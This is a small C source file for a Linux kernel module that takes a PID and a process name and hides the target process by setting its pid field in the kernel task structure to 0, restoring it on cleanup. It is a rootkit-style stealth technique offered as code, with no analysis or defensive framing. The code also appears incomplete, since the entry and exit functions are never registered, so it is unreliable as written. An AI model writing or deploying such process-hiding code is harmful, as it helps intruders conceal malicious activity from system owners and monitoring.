#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("JASON.LIN.YU");

static pid_t pid = 2237;
static pid_t old_pid = 0;
static struct task_struct* task = NULL;
// static struct task_struct *old_task = NULL;
static char* mystring = NULL;
module_param(pid, int, 0);
module_param(mystring, charp, 0);
MODULE_PARM_DESC(pid, "The pid to hide");
MODULE_PARM_DESC(mystring, "The process's name");

int start_module(void) {
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (NULL == task) {
        return 1;
    }
    old_pid = task->pid;
    task->pid = 0;  //关键在于改变pid=0
    return 0;
}

void clean_module(void) {
    struct list_head* list;
    list_for_each(list, &current->tasks) {
        task = list_entry(list, struct task_struct, tasks);
        if (0 == memcmp(mystring, task->comm, strlen(mystring) + 1)) {
            task->pid = old_pid;  //替换pid
            break;
        }
    }
    return;
}